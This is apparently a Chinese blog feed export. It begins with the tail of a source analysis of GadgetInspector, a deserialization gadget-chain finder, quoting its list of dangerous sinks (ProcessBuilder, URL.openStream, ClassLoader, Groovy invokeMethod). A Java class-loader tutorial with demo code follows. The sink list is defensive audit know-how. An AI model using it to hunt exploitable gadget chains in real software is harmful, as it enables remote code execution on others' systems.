class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Shutdown"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/Runtime"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"exit"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/nio/file/Files"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"newOutputStream"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/lang/ProcessBuilder"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>) &amp;&amp; argIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"java/lang/ClassLoader"</span>))</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"&lt;init&gt;"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"java/net/URL"</span>) &amp;&amp; method.getName().equals(<span class="string">"openStream"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Some groovy-specific sinks</span></span><br><span class="line">        <span class="keyword">if</span> (method.getClassReference().getName().equals(<span class="string">"org/codehaus/groovy/runtime/InvokerHelper"</span>)</span><br><span class="line">                &amp;&amp; method.getName().equals(<span class="string">"invokeMethod"</span>) &amp;&amp; argIndex == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">"groovy/lang/MetaClass"</span>))</span><br><span class="line">                &amp;&amp; Arrays.asList(<span class="string">"invokeMethod"</span>, <span class="string">"invokeConstructor"</span>, <span class="string">"invokeStaticMethod"</span>).contains(method.getName())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对于每个入口节点来说，其全部子方法调用、孙子方法调用等等递归下去，就构成了一棵树。之前的步骤所做的，就相当于生成了这颗树，而这一步所做的，就是从根节点出发，找到一条通往叶子节点的道路，使得这个叶子节点正好是我们所期望的sink方法。gadgetinspector对树的遍历采用的是广度优先(BFS)，而且对于已经检查过的节点会直接跳过，<strong>这样减少了运行开销，避免了环路，但是丢掉了很多其他链。</strong></p>
<h2 id="GI的缺点"><a href="#GI的缺点" class="headerlink" title="GI的缺点"></a>GI的缺点</h2><ol>
<li>对于运行时确定的实现，也就是多态性，没办法做到污点分析：</li>
<li>还是因为多态的原因，还是没法做到完整的调用链搜索</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>源码分析</category>
      </categories>
      <tags>
        <tag>GadgetInspector</tag>
      </tags>
  </entry>
  <entry>
    <title>Java类加载器</title>
    <url>/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>梦里玉人方下马，恨他天外一声鸿。</p>
</blockquote>
<p>今天来总结类加载机制。</p>
<a id="more"></a>



<h1 id="编译器与解释器"><a href="#编译器与解释器" class="headerlink" title="编译器与解释器"></a>编译器与解释器</h1><p>我们通常会把编程语言的处理器分为<code>编译器</code>和<code>解释器</code>。</p>
<p>编译器则是将某种语言代码转换为另外一种语言的程序，通常会转换为机器语言。</p>
<p>解释器是一种用来执行程序的软件，它会根据程序代码中的算法执行运算，如果这个软件是根据虚拟的或者类似机器语言的程序设计语言写成，那也称为虚拟机。</p>
<p>Java会混用解释器和编译器，Java会先通过编译器将源代码转换为Java二进制代码（字节码），并将这种虚拟的机器语言保存在文件中（通常是.class文件），之后通过Java虚拟机（JVM）的解释器来执行这段代码。</p>
<h1 id="类和类加载器"><a href="#类和类加载器" class="headerlink" title="类和类加载器"></a>类和类加载器</h1><p>这里直接上《深入理解Java虚拟机》原文，写得很好：</p>
<blockquote>
<p>对于任意的一个类。其实都必须由加载它的类加载器和这个类本身一起共同确立其在Java虚拟机中的唯一性，每一个类加载器，都拥有一个独立的类名称空间。两个类是否相等，其实只有这两个类都是由同一个类加载器加载的前提下才有意义。只要加载它们的类加载器不同，那么这两个类就必定不相等。</p>
</blockquote>
<p>Java是面向对象的语言，字节码中包含了很多Class信息。在 JVM 解释执行的过程中，ClassLoader就是用来加载Java类的，它会将Java字节码加载到内存中。每个 Class 类对象的内部都有一个 classLoader 属性来标识自己是由哪个 ClassLoader 加载的。</p>
<p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20210306155604696.png" alt="image-20210306155604696"></p>
<p>Java的类加载体系：parent属性 理论关系</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Bootstrap Classloader -&gt; Extension ClassLoader -&gt; Application ClassLoader</span><br></pre></td></tr></table></figure>



<p>JDK类实现体系：实现/继承的关系，通常继承URLClassLoader</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader -&gt; Secure ClassLoader -&gt; URL ClassLoader -&gt; ExtClassLoader/AppClassLoader</span><br></pre></td></tr></table></figure>

<p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20210225193851385.png" alt="image-20210225193851385"></p>
<h1 id="双亲委派机制"><a href="#双亲委派机制" class="headerlink" title="双亲委派机制"></a>双亲委派机制</h1><p>站在JVM角度来看，只存在两种不同的类加载器：</p>
<ul>
<li>启动类加载器 BootstrapClassLoader/使用C++实现</li>
<li>其他类加载器/都是由Java实现/全部继承抽象类java.lang.ClassLoader</li>
</ul>
<h2 id="Bootstrap-ClassLoader-启动类加载器"><a href="#Bootstrap-ClassLoader-启动类加载器" class="headerlink" title="Bootstrap ClassLoader 启动类加载器"></a>Bootstrap ClassLoader 启动类加载器</h2><p>负责加载存放在<code>JAVA_HOME/lib</code>目录下，或者被-Xbooclasspath参数所指定的路径中存放的，并且可以被JVM识别的类库，加载到虚拟机的内存中。</p>
<p>底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中。</p>
<p>出于安全考虑，BootstrapClassLoader只加载包名为java、javax、sun等开头的类。</p>
<p>它负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.<em>.</em> 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。</p>
<h2 id="Extension-ClassLoader-扩展类加载器"><a href="#Extension-ClassLoader-扩展类加载器" class="headerlink" title="Extension ClassLoader 扩展类加载器"></a>Extension ClassLoader 扩展类加载器</h2><p>负责加载Java的扩展类库，默认加载<code>JAVA_HOME/jre/lib/ext/</code>目下的所有jar，库名通常以 javax 开头。</p>
<h2 id="Application-ClassLoader-系统类加载器"><a href="#Application-ClassLoader-系统类加载器" class="headerlink" title="Application ClassLoader 系统类加载器"></a>Application ClassLoader 系统类加载器</h2><p>直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。</p>
<p>如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。</p>
<p>可以通过 ClassLoader.getSystemClassLoader() 来获取它。</p>
<h2 id="特殊：URLClassloader"><a href="#特殊：URLClassloader" class="headerlink" title="特殊：URLClassloader"></a>特殊：URLClassloader</h2><p>ClassLoader抽象类的一种实现，它可以根据URL搜索类或资源，并进行远程加载。在JDK实现中，BootstrapClassLoader、ExtClassLoader、AppClassLoader等都是 URLClassLoader 的子类。</p>
<p>ExtClassLoader 和 AppClassLoader 类的实现代码位于rt.jar 中的 sun.misc.Launcher 类中，Launcher是由BootstrapClassLoader加载的。</p>
<h2 id="用户自定义类加载器"><a href="#用户自定义类加载器" class="headerlink" title="用户自定义类加载器"></a>用户自定义类加载器</h2><p>开发人员可以通过继承java.lang.ClassLoader 类的方式实现自己的类加载器，重写 findClass()方法，以满足一些特殊的需求。</p>
<p><strong>我们可以通过继承java.lang.ClassLoader类的方式实现自己的类加载器</strong>。具体实现方法我们等下单独讲解。</p>
<blockquote>
<p>双亲委派模型工作过程是：如果一个类加载器收到类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器完成。每个类加载器都是如此，只有当父加载器在自己的搜索范围内找不到指定的类时（即ClassNotFoundException），子加载器才会尝试自己去加载。</p>
</blockquote>
<p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20201105161406752.png" alt="image-20201105161406752"></p>
<h1 id="ClassLoader类-核心方法"><a href="#ClassLoader类-核心方法" class="headerlink" title="ClassLoader类 - 核心方法"></a>ClassLoader类 - 核心方法</h1><p>每个 ClassLoader 对象都是一个 java.lang.ClassLoader 的实例。每个Class对象都被这些 ClassLoader 对象所加载，通过继承java.lang.ClassLoader 可以扩展出自定义 ClassLoader，并使用这些自定义的 ClassLoader 对类进行加载。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> Class <span class="title">loadClass</span><span class="params">(String name)</span></span>;</span><br><span class="line">	 <span class="function"><span class="keyword">protected</span> Class <span class="title">defineClass</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span>;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> URL <span class="title">getResource</span><span class="params">(String name)</span></span>;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> Enumeration <span class="title">getResources</span><span class="params">(String name)</span></span>;</span><br><span class="line">	 <span class="function"><span class="keyword">public</span> ClassLoader <span class="title">getParent</span><span class="params">()</span></span>;</span><br><span class="line">	 Class&lt;?&gt; findClass(String name)</span><br><span class="line">     <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>ClassLoader</code>类有如下核心方法：</p>
<ol>
<li><code>loadClass</code>(加载指定的Java类) 它接受一个全类名，然后返回一个 Class 类型的实例。</li>
<li><code>findClass</code>(查找指定的Java类) 查找名称为name都一个类是否存在，返回的结果是java.lang.Class类对象实例。</li>
<li><code>findLoadedClass</code>(查找JVM已经加载过的类)</li>
<li><code>defineClass</code>(定义一个Java类) 接受一组字节，实例化为一个Class 类型实例。</li>
<li><code>resolveClass</code>(链接指定的Java类)</li>
<li><code>getParent</code>返回其parent ClassLoader</li>
</ol>
<p>重点逻辑：</p>
<ul>
<li><p>loadClass(String classname)，参数为需要加载的全限定类名，该方法会先查看目标类是否已经被加载，查看父级加载器并递归调用loadClass()，如果都没找到则调用findClass()。</p>
</li>
<li><p>findClass()，搜索类的位置，一般会根据名称或位置加载.class字节码文件，获取字节码数组，然后调用defineClass()。</p>
</li>
<li><p>defineClass()，将字节码转换为 JVM 的 java.lang.Class 对象。</p>
</li>
</ul>
<p>整个demo玩玩看；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ClassLoader cl = Hello<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(cl);</span><br><span class="line"></span><br><span class="line">        ClassLoader clParent = cl.getParent();</span><br><span class="line">        System.out.println(clParent);</span><br><span class="line"></span><br><span class="line">        ClassLoader cl2 = clParent.getParent();</span><br><span class="line">        System.out.println(cl2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>输出：</p>
<p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20201105164854799.png" alt="image-20201105164854799"></p>
<h2 id="重点：loadClass"><a href="#重点：loadClass" class="headerlink" title="重点：loadClass()"></a>重点：loadClass()</h2><p>源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">            Class c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                    <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>它先使用了findLoadedClass(String)方法来检查这个类是否被加载过</p>
<p>接着使用父加载器调用loadClass(String)方法</p>
<p>之后就调用findClass(String) 方法装载类。</p>
<p>最后通过上述步骤找到了对应的类，并且接收到的resolve参数的值为true,那么就会调用resolveClass(Class)方法来处理类。</p>
<h1 id="类加载方式"><a href="#类加载方式" class="headerlink" title="类加载方式"></a>类加载方式</h1><p>显式加载：通常使用<code>Java反射</code>或者<code>ClassLoader</code>来动态加载一个类对象。也可以理解为类动态加载</p>
<p>隐式加载：<code>类名.方法名()</code>或<code>new</code>类实例。</p>
<p>Demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射加载Test示例</span></span><br><span class="line">Class.forName(<span class="string">"com.sec.Test"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoader加载Test示例</span></span><br><span class="line"><span class="keyword">this</span>.getClass.getClassLoader().loadClass(<span class="string">"com.sec.Test"</span>);</span><br></pre></td></tr></table></figure>

<p><code>Class.forName(&quot;类名&quot;)</code>默认会初始化被加载类的静态属性和方法</p>
<p>如果不希望初始化类可以使用<code>Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)</code></p>
<p><code>ClassLoader.loadClass</code>默认不会初始化类，只是将类加载进JVM虚拟机。</p>
<p><code>Class.forName()</code>可以加载数组，而<code>ClassLoader.loadClass()</code> 不能。</p>
<h1 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h1><p> Java 中提供的默认 ClassLoader 只加载指定目录下面的 jar 和 class ，我们从上面了解到 ClassLoader是一个抽象类，实现自定义的 ClassLoader 需要继承该类并实现里面的方法。</p>
<p><strong><code>java.lang.ClassLoader</code>是所有的类加载器的父类。</strong></p>
<p><strong>一般情况下，我们重写父类的 findClass 方法即可。</strong></p>
<p><strong>双亲委派机制是loadClass()函数负责的。</strong></p>
<p>*<em>一个ClassLoader创建时如果没有指定parent，那么它的parent默认就是AppClassLoader。 *</em></p>
<p>如果自定义一个ClassLoader，默认的parent父加载器是AppClassLoader，因为这样就能够保证它能访问系统内置加载器加载成功的class文件。</p>
<p>ClassLoader 方法那么多为什么只重写 findClass 方法？ 因为 JDK 已经在 loadClass 方法中帮我们实现了 ClassLoader 搜索类的算法，当在 loadClass 方法中搜索不到类时，loadClass 方法就会调用findClass 方法来搜索类，所以我们只需重写该方法即可。如没有特殊的要求，一般不建议重写 loadClass 搜索类的算法。</p>
<p>步骤：</p>
<ol>
<li>编写一个类继承自ClassLoader抽象类。</li>
<li>覆盖它的<code>findClass()</code>方法。</li>
<li>在<code>findClass()</code>方法中调用<code>defineClass()</code>。</li>
</ol>
<h3 id="自定义-ClassLoader-DEMO"><a href="#自定义-ClassLoader-DEMO" class="headerlink" title="自定义 ClassLoader DEMO"></a>自定义 ClassLoader DEMO</h3><p>假如我们自定义一个 classloader，我们可以编写一个测试类来说明。在当前目录下面新建一个 Hello 类。里面有个方法 sayHello，然后放入到指定目录下面，如：我当前的目录为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello! ----------&gt; DIYClassLoader"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着我们需要自定义一个 ClassLoader 来继承系统的 ClassLoader，命名为 DIYClassLoader 类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DIYClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String mylibPath;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DIYClassLoader</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        mylibPath = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        String fileName = getFileName(name);</span><br><span class="line">        File file = <span class="keyword">new</span> File(mylibPath,fileName);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            FileInputStream is = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">while</span>((len = is.read())!= -<span class="number">1</span>)&#123;</span><br><span class="line">                    bos.write(len);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] data = bos.toByteArray();</span><br><span class="line">            is.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取要加载 的class文件名</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getFileName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = name.lastIndexOf(<span class="string">'.'</span>);</span><br><span class="line">        <span class="keyword">if</span>(index == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> name+<span class="string">".class"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name.substring(index)+<span class="string">".class"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在需要的是写一个调用方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        DIYClassLoader diyClassLoader = <span class="keyword">new</span> DIYClassLoader(<span class="string">"/path"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; c = diyClassLoader.loadClass(<span class="string">"class.name"</span>);</span><br><span class="line">            <span class="keyword">if</span> (c != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Object obj = c.newInstance();</span><br><span class="line">                    Method method = c.getDeclaredMethod(<span class="string">"sayHello"</span>, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">//通过反射调用Hello类的sayHello方法</span></span><br><span class="line">                    method.invoke(obj, <span class="keyword">null</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最终实现方法调用：</p>
<p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20201106092414009.png" alt="image-20201106092414009"></p>
<h1 id="重要方法-loadClass"><a href="#重要方法-loadClass" class="headerlink" title="重要方法 loadClass"></a>重要方法 loadClass</h1><p>直接看源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">            <span class="comment">// 首先，检测是否已经加载</span></span><br><span class="line">            Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">//父加载器不为空则调用父加载器的loadClass</span></span><br><span class="line">                        c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//父加载器为空则调用Bootstrap Classloader</span></span><br><span class="line">                        c = findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                    <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                    <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                    <span class="comment">// to find the class.</span></span><br><span class="line">                  	<span class="comment">// 如果该类未被加载，并且父类加载器也没有找到，则调用findclass</span></span><br><span class="line">                    <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                  </span><br><span class="line">                  	<span class="comment">//！！！！！！！！！！！</span></span><br><span class="line">                    c = findClass(name);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                    sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                    sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">              	<span class="comment">//需不需要连接阶段，调用resolveClass()</span></span><br><span class="line">                resolveClass(c);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>上面是方法原型，一般实现这个方法的步骤是</p>
<ol>
<li>执行<code>findLoadedClass(String)</code>去检测这个class是不是已经加载过了，已经加载过的都应该在缓存中。</li>
<li>执行父加载器的<code>loadClass</code>方法。如果父加载器为空，则Bootstrap ClassLoader加载器去加载。这也解释了ExtClassLoader的parent为null,但仍然说Bootstrap ClassLoader是它的父加载器。</li>
<li>如果向上委托父加载器没有加载成功，则通过<code>findClass(String)</code>查找。</li>
</ol>
<p>如果class在上面的步骤中找到了，参数resolve又是true的话（上文提到的==resolveClass==，resolve参数就是表示需不需要连接阶段），那么<code>loadClass()</code>又会调用<code>resolveClass(Class)</code>这个方法去链接，来生成最终的Class对象。 </p>
<h1 id="类加载主要的三个阶段"><a href="#类加载主要的三个阶段" class="headerlink" title="类加载主要的三个阶段"></a>类加载主要的三个阶段</h1><ol>
<li><p>加载</p>
</li>
<li><p>连接</p>
<ul>
<li>验证：为了保证加载进来的字节流符合虚拟机规范，不会造成安全错误。</li>
<li>准备：为类变量分配内存，“预分配内存”，并且赋予初值0。</li>
<li>解析：将常量池中的符号引用转换为直接引用（内存块），替换为具体的内存地址或偏移量。</li>
</ul>
</li>
<li><p>初始化：只给static修饰的变量或者语句赋值，执行静态代码块。</p>
<p>如果初始化一个类的时候，其父类尚未初始化，则优先初始化其父类。</p>
<p>如果同时包含多个静态变量和静态代码块，则按照自上而下的顺序依次执行。</p>
</li>
</ol>
<h1 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h1><p>在java.net包中，JDK提供了一个更加易用的类加载器URLClassLoader，它继承了ClassLoader，能够从本地或者网络上指定的位置加载类，我们可以使用该类作为自定义的类加载器使用。</p>
<p>URLClassLoader是ClassLoader的子类，它用于从指向 JAR 文件和目录的 URL 的搜索路径加载类和资源。也就是说，通过URLClassLoader就可以加载指定jar中的class到内存中。<br>下面来看一个例子，在该例子中，我们要完成的工作是利用URLClassLoader加载jar并运行其中的类的某个方法。</p>
<p>构造方法：</p>
<p><code>public URLClassLoader(URL[] urls)</code>：指定要加载的类的所在地URL地址，父类加载器默认为App系统类加载器</p>
<p><code>public URLClassLoader(URL[] urls,ClassLoader parent)</code>：指定要加载的类的所在的URL地址，并指定父类加载器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file = <span class="keyword">new</span> File(jar文件全路径); </span><br><span class="line">URL url = file.toURL(); </span><br><span class="line">URLClassLoader loader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[] &#123; url &#125;); </span><br><span class="line">Class tidyClazz = loader.loadClass(所需<span class="class"><span class="keyword">class</span>的含包名的全名)</span>;</span><br></pre></td></tr></table></figure>

<p><img src="../images/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/image-20201106103945821.png" alt="image-20201106103945821"></p>
<h1 id="Java-运行时类加载"><a href="#Java-运行时类加载" class="headerlink" title="Java 运行时类加载"></a>Java 运行时类加载</h1><p>ClassLoader.loadClass()与Class.forName()是反射用来构造类，给一个类名即可，返回值是Class。</p>
